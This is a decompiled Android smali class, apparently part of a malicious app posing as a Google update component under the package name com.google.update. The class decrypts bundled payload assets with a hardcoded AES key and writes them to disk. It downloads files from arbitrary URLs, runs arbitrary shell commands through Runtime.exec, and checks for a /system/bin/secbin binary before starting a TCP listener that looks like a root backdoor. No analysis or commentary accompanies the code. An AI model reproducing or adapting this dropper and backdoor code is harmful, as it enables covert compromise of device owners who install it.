.class public Lcom/google/update/Utils;
.super Ljava/lang/Object;
.source "Utils.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/update/Utils$PhoneState;,
        Lcom/google/update/Utils$PkgManager;,
        Lcom/google/update/Utils$TCP;
    }
.end annotation


# static fields
.field private static defPassword:[B


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 221
    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    sput-object v0, Lcom/google/update/Utils;->defPassword:[B

    .line 40
    return-void

    .line 221
    :array_0
    .array-data 1
        0x46t
        0x75t
        0x63t
        0x6bt
        0x5ft
        0x73t
        0x45t
        0x78t
        0x79t
        0x2dt
        0x61t
        0x4ct
        0x6ct
        0x21t
        0x50t
        0x77t
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 40
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static checkPermission()Z
    .locals 2

    .prologue
    .line 89
    new-instance v0, Ljava/io/File;

    const-string v1, "/system/bin/secbin"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 90
    invoke-static {}, Lcom/google/update/Utils;->tryStartPermission()Z

    move-result v0

    .line 92
    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public static copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V
    .locals 9
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "src"    # Ljava/lang/String;
    .param p2, "dest"    # Ljava/lang/String;
    .param p3, "len"    # I

    .prologue
    .line 132
    const/4 v4, 0x0

    .line 133
    .local v4, "myOutput":Ljava/io/OutputStream;
    const/4 v3, 0x0

    .line 134
    .local v3, "myInput":Ljava/io/InputStream;
    if-gtz p3, :cond_1

    .line 151
    :cond_0
    :goto_0
    return-void

    .line 137
    :cond_1
    :try_start_0
    new-instance v5, Ljava/io/FileOutputStream;

    invoke-direct {v5, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 139
    .end local v4    # "myOutput":Ljava/io/OutputStream;
    .local v5, "myOutput":Ljava/io/OutputStream;
    :try_start_1
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v6

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "/assets/"

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/Class;->getResourceAsStream(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v3

    .line 140
    new-array v0, p3, [B

    .line 141
    .local v0, "buff":[B
    invoke-virtual {v3, v0}, Ljava/io/InputStream;->read([B)I

    .line 142
    invoke-static {v0}, Lcom/google/update/Utils;->decrypt([B)[B

    move-result-object v1

    .line 143
    .local v1, "decryptBuff":[B
    invoke-virtual {v5, v1}, Ljava/io/OutputStream;->write([B)V

    .line 144
    invoke-virtual {v5}, Ljava/io/OutputStream;->flush()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_7
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 148
    if-eqz v3, :cond_2

    :try_start_2
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_6

    .line 149
    :cond_2
    :goto_1
    if-eqz v5, :cond_6

    :try_start_3
    invoke-virtual {v5}, Ljava/io/OutputStream;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    move-object v4, v5

    .end local v5    # "myOutput":Ljava/io/OutputStream;
    .restart local v4    # "myOutput":Ljava/io/OutputStream;
    goto :goto_0

    .line 145
    .end local v0    # "buff":[B
    .end local v1    # "decryptBuff":[B
    :catch_0
    move-exception v6

    move-object v2, v6

    .line 146
    .local v2, "e":Ljava/lang/Exception;
    :goto_2
    :try_start_4
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 148
    if-eqz v3, :cond_3

    :try_start_5
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 149
    :cond_3
    :goto_3
    if-eqz v4, :cond_0

    :try_start_6
    invoke-virtual {v4}, Ljava/io/OutputStream;->close()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_0

    :catch_1
    move-exception v6

    goto :goto_0

    .line 147
    .end local v2    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v6

    .line 148
    :goto_4
    if-eqz v3, :cond_4

    :try_start_7
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    .line 149
    :cond_4
    :goto_5
    if-eqz v4, :cond_5

    :try_start_8
    invoke-virtual {v4}, Ljava/io/OutputStream;->close()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_5

    .line 150
    :cond_5
    :goto_6
    throw v6

    .line 149
    .end local v4    # "myOutput":Ljava/io/OutputStream;
    .restart local v0    # "buff":[B
    .restart local v1    # "decryptBuff":[B
    .restart local v5    # "myOutput":Ljava/io/OutputStream;
    :catch_2
    move-exception v6

    move-object v4, v5

    .end local v5    # "myOutput":Ljava/io/OutputStream;
    .restart local v4    # "myOutput":Ljava/io/OutputStream;
    goto :goto_0

    .line 148
    .end local v0    # "buff":[B
    .end local v1    # "decryptBuff":[B
    .restart local v2    # "e":Ljava/lang/Exception;
    :catch_3
    move-exception v6

    goto :goto_3

    .end local v2    # "e":Ljava/lang/Exception;
    :catch_4
    move-exception v7

    goto :goto_5

    .line 149
    :catch_5
    move-exception v7

    goto :goto_6

    .line 148
    .end local v4    # "myOutput":Ljava/io/OutputStream;
    .restart local v0    # "buff":[B
    .restart local v1    # "decryptBuff":[B
    .restart local v5    # "myOutput":Ljava/io/OutputStream;
    :catch_6
    move-exception v6

    goto :goto_1

    .line 147
    .end local v0    # "buff":[B
    .end local v1    # "decryptBuff":[B
    :catchall_1
    move-exception v6

    move-object v4, v5

    .end local v5    # "myOutput":Ljava/io/OutputStream;
    .restart local v4    # "myOutput":Ljava/io/OutputStream;
    goto :goto_4

    .line 145
    .end local v4    # "myOutput":Ljava/io/OutputStream;
    .restart local v5    # "myOutput":Ljava/io/OutputStream;
    :catch_7
    move-exception v6

    move-object v2, v6

    move-object v4, v5

    .end local v5    # "myOutput":Ljava/io/OutputStream;
    .restart local v4    # "myOutput":Ljava/io/OutputStream;
    goto :goto_2

    .end local v4    # "myOutput":Ljava/io/OutputStream;
    .restart local v0    # "buff":[B
    .restart local v1    # "decryptBuff":[B
    .restart local v5    # "myOutput":Ljava/io/OutputStream;
    :cond_6
    move-object v4, v5

    .end local v5    # "myOutput":Ljava/io/OutputStream;
    .restart local v4    # "myOutput":Ljava/io/OutputStream;
    goto :goto_0
.end method

.method public static createFile(Ljava/lang/String;)Ljava/io/File;
    .locals 3
    .param p0, "path"    # Ljava/lang/String;

    .prologue
    .line 58
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 59
    .local v1, "file":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    .line 61
    :try_start_0
    invoke-virtual {v1}, Ljava/io/File;->createNewFile()Z
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 67
    :cond_0
    :goto_0
    return-object v1

    .line 62
    :catch_0
    move-exception v0

    .line 63
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method public static decrypt([B)[B
    .locals 6
    .param p0, "encrypted"    # [B
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    const-string v5, "AES"

    .line 226
    new-instance v2, Ljavax/crypto/spec/SecretKeySpec;

    sget-object v3, Lcom/google/update/Utils;->defPassword:[B

    const-string v4, "AES"

    invoke-direct {v2, v3, v5}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 227
    .local v2, "skeySpec":Ljavax/crypto/spec/SecretKeySpec;
    const-string v3, "AES"

    invoke-static {v5}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    .line 228
    .local v0, "cipher":Ljavax/crypto/Cipher;
    const/4 v3, 0x2

    invoke-virtual {v0, v3, v2}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 229
    invoke-virtual {v0, p0}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v1

    .line 230
    .local v1, "decrypted":[B
    return-object v1
.end method

.method public static downloadFile(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;
    .locals 7
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "url"    # Ljava/lang/String;

    .prologue
    .line 159
    if-eqz p1, :cond_0

    const-string v0, ""

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    const/4 p0, 0x0

    .line 217
    .end local p0    # "context":Landroid/content/Context;
    .end local p1    # "url":Ljava/lang/String;
    :goto_0
    return-object p0

    .line 161
    .restart local p0    # "context":Landroid/content/Context;
    .restart local p1    # "url":Ljava/lang/String;
    :cond_1
    const/4 v0, 0x0

    .line 163
    .local v0, "filePath":Ljava/net/URL;
    :try_start_0
    new-instance v1, Ljava/net/URL;

    invoke-direct {v1, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 165
    .end local v0    # "filePath":Ljava/net/URL;
    .local v1, "filePath":Ljava/net/URL;
    const/4 v0, 0x0

    .line 166
    .local v0, "hc":Ljava/net/HttpURLConnection;
    :try_start_1
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    .end local v0    # "hc":Ljava/net/HttpURLConnection;
    check-cast v0, Ljava/net/HttpURLConnection;

    .line 167
    .restart local v0    # "hc":Ljava/net/HttpURLConnection;
    const/16 v2, 0x7530

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 168
    const/16 v2, 0x7530

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 169
    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 170
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->connect()V

    .line 172
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    .line 174
    .local v3, "is":Ljava/io/InputStream;
    new-instance v0, Ljava/io/File;

    .end local v0    # "hc":Ljava/net/HttpURLConnection;
    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 175
    .local v0, "file":Ljava/io/File;
    if-nez v0, :cond_2

    const/4 p0, 0x0

    goto :goto_0

    .line 177
    :cond_2
    invoke-virtual {v0}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v0

    .line 178
    .local v0, "fileName":Ljava/lang/String;
    const-string p1, "download"

    .end local p1    # "url":Ljava/lang/String;
    invoke-static {p0, p1}, Lcom/google/update/Utils;->getPath(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 179
    .local v4, "path":Ljava/lang/String;
    new-instance p0, Ljava/io/File;

    .end local p0    # "context":Landroid/content/Context;
    invoke-direct {p0, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 180
    .local p0, "ff":Ljava/io/File;
    invoke-virtual {p0}, Ljava/io/File;->exists()Z

    move-result p1

    if-nez p1, :cond_3

    invoke-virtual {p0}, Ljava/io/File;->mkdir()Z

    .line 182
    :cond_3
    const-string p1, "sdcard"

    invoke-virtual {v4, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-nez p1, :cond_4

    .line 183
    invoke-virtual {p0}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object p1

    .line 184
    .local p1, "files":[Ljava/io/File;
    if-eqz p1, :cond_4

    array-length p0, p1

    .end local p0    # "ff":Ljava/io/File;
    if-lez p0, :cond_4

    .line 185
    array-length v2, p1

    const/4 p0, 0x0

    move v5, p0

    :goto_1
    if-lt v5, v2, :cond_5

    .line 191
    .end local p1    # "files":[Ljava/io/File;
    :cond_4
    const/4 p0, 0x0

    .line 192
    .local p0, "fos":Ljava/io/FileOutputStream;
    new-instance v2, Ljava/io/FileOutputStream;

    new-instance p0, Ljava/lang/StringBuilder;

    .end local p0    # "fos":Ljava/io/FileOutputStream;
    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p1

    invoke-direct {p0, p1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p0

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-direct {v2, p0}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    .line 194
    .local v2, "fos":Ljava/io/FileOutputStream;
    const/16 p0, 0x800

    new-array p0, p0, [B

    .line 195
    .local p0, "buffer":[B
    const/4 p1, 0x0

    .line 196
    .local p1, "byteread":I
    if-eqz v3, :cond_8

    if-eqz v2, :cond_8

    .line 198
    :goto_2
    invoke-virtual {v3, p0}, Ljava/io/InputStream;->read([B)I

    move-result p1

    const/4 v5, -0x1

    if-ne p1, v5, :cond_7

    .line 201
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->flush()V

    .line 202
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 203
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V

    .line 205
    const/4 p0, 0x2

    new-array p1, p0, [Ljava/lang/String;

    .line 206
    .end local p0    # "buffer":[B
    .local p1, "info":[Ljava/lang/String;
    const/4 p0, 0x0

    new-instance v2, Ljava/lang/StringBuilder;

    .end local v2    # "fos":Ljava/io/FileOutputStream;
    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    .end local v3    # "is":Ljava/io/InputStream;
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    aput-object v2, p1, p0

    .line 207
    const/4 p0, 0x1

    aput-object v0, p1, p0

    .line 208
    new-instance p0, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    .end local v0    # "fileName":Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 209
    .local p0, "downloadFile":Ljava/io/File;
    invoke-virtual {p0}, Ljava/io/File;->exists()Z

    move-result p0

    .end local p0    # "downloadFile":Ljava/io/File;
    if-eqz p0, :cond_8

    move-object p0, p1

    .line 210
    goto/16 :goto_0

    .line 185
    .restart local v0    # "fileName":Ljava/lang/String;
    .restart local v3    # "is":Ljava/io/InputStream;
    .local p1, "files":[Ljava/io/File;
    :cond_5
    aget-object p0, p1, v5

    .line 186
    .local p0, "f":Ljava/io/File;
    invoke-virtual {p0}, Ljava/io/File;->exists()Z

    move-result v6

    if-eqz v6, :cond_6

    invoke-virtual {p0}, Ljava/io/File;->delete()Z

    .line 185
    :cond_6
    add-int/lit8 p0, v5, 0x1

    move v5, p0

    goto :goto_1

    .line 199
    .restart local v2    # "fos":Ljava/io/FileOutputStream;
    .local p0, "buffer":[B
    .local p1, "byteread":I
    :cond_7
    const/4 v5, 0x0

    invoke-virtual {v2, p0, v5, p1}, Ljava/io/FileOutputStream;->write([BII)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    .line 213
    .end local v0    # "fileName":Ljava/lang/String;
    .end local v2    # "fos":Ljava/io/FileOutputStream;
    .end local v3    # "is":Ljava/io/InputStream;
    .end local v4    # "path":Ljava/lang/String;
    .end local p0    # "buffer":[B
    .end local p1    # "byteread":I
    :catch_0
    move-exception p0

    move-object p1, v1

    .line 214
    .end local v1    # "filePath":Ljava/net/URL;
    .local p0, "e":Ljava/lang/Exception;
    .local p1, "filePath":Ljava/net/URL;
    :goto_3
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    move-object p0, p1

    .line 217
    .end local p1    # "filePath":Ljava/net/URL;
    .local p0, "filePath":Ljava/net/URL;
    :goto_4
    const/4 p0, 0x0

    goto/16 :goto_0

    .line 213
    .local v0, "filePath":Ljava/net/URL;
    .local p0, "context":Landroid/content/Context;
    .local p1, "url":Ljava/lang/String;
    :catch_1
    move-exception p0

    move-object p1, v0

    .end local v0    # "filePath":Ljava/net/URL;
    .local p1, "filePath":Ljava/net/URL;
    goto :goto_3

    .end local p0    # "context":Landroid/content/Context;
    .end local p1    # "filePath":Ljava/net/URL;
    .restart local v1    # "filePath":Ljava/net/URL;
    .restart local v4    # "path":Ljava/lang/String;
    :cond_8
    move-object p0, v1

    .end local v1    # "filePath":Ljava/net/URL;
    .local p0, "filePath":Ljava/net/URL;
    goto :goto_4
.end method

.method public static getPath(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "file"    # Ljava/lang/String;

    .prologue
    const-string v3, "/"

    .line 44
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v0

    .line 45
    .local v0, "path":Ljava/lang/String;
    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v1

    .line 46
    const-string v2, "mounted"

    .line 45
    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 47
    invoke-virtual {p0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v0

    .line 49
    :cond_0
    if-eqz p1, :cond_1

    .line 50
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "/"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 53
    :cond_1
    return-object v0
.end method

.method public static isConnected(Landroid/content/Context;)Z
    .locals 5
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    const/4 v4, 0x0

    const/4 v3, 0x1

    .line 74
    const-string v2, "connectivity"

    invoke-virtual {p0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 77
    .local v0, "cmd":Landroid/net/ConnectivityManager;
    invoke-virtual {v0, v3}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v1

    .line 78
    .local v1, "info":Landroid/net/NetworkInfo;
    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_0

    move v2, v3

    .line 83
    :goto_0
    return v2

    .line 80
    :cond_0
    invoke-virtual {v0, v4}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v1

    .line 81
    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_1

    move v2, v3

    goto :goto_0

    :cond_1
    move v2, v4

    .line 83
    goto :goto_0
.end method

.method public static oldrun(Ljava/lang/String;Ljava/lang/String;)V
    .locals 5
    .param p0, "cmd"    # Ljava/lang/String;
    .param p1, "param"    # Ljava/lang/String;

    .prologue
    .line 121
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v2

    .line 122
    .local v2, "rt":Ljava/lang/Runtime;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {p0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, " "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 123
    .local v1, "fullCmd":Ljava/lang/String;
    invoke-virtual {v2, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 127
    .end local v1    # "fullCmd":Ljava/lang/String;
    .end local v2    # "rt":Ljava/lang/Runtime;
    :goto_0
    return-void

    .line 124
    :catch_0
    move-exception v3

    move-object v0, v3

    .line 125
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public static runsh(Ljava/lang/String;Ljava/lang/String;)V
    .locals 3
    .param p0, "cmd"    # Ljava/lang/String;
    .param p1, "param"    # Ljava/lang/String;

    .prologue
    .line 106
    :try_start_0
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/google/update/Utils$1;

    invoke-direct {v2, p0, p1}, Lcom/google/update/Utils$1;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 111
    .local v1, "thread":Ljava/lang/Thread;
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 116
    .end local v1    # "thread":Ljava/lang/Thread;
    :goto_0
    return-void

    .line 112
    :catch_0
    move-exception v2

    move-object v0, v2

    .line 113
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public static tryStartPermission()Z
    .locals 1

    .prologue
    .line 97
    invoke-static {}, Lcom/google/update/Utils$TCP;->isListened()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    .line 99
    :goto_0
    return v0

    .line 98
    :cond_0
    invoke-static {}, Lcom/google/update/Utils$TCP;->startListen()V

    .line 99
    invoke-static {}, Lcom/google/update/Utils$TCP;->isListened()Z

    move-result v0

    goto :goto_0
.end method
